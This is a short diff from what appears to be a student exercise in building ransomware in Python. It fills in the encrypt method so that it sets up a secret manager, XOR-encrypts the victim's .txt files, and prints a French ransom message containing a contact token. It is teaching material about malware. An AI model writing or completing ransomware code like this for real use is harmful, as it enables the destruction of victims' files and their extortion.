@@ -42,7 +42,10 @@ class Ransomware:
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        secret_manager = SecretManager() #je crée un objet secret manager
+        secret_manager.setup() #utilisation de la fonction setup de ma classe 
+        secret_manager.xorfiles(self.get_files(".txt")) #Liste les fichiers avec la fonction  get_files puis utilise xerfiles sur eux
+        print(f"Bonjour :) Voici comment me contacter :D : {secret_manager.get_hex_token()}" ) #Je donne bien le token hashé en hexa à la victime
 
     def decrypt(self):
         # main function for decrypting (see PDF)
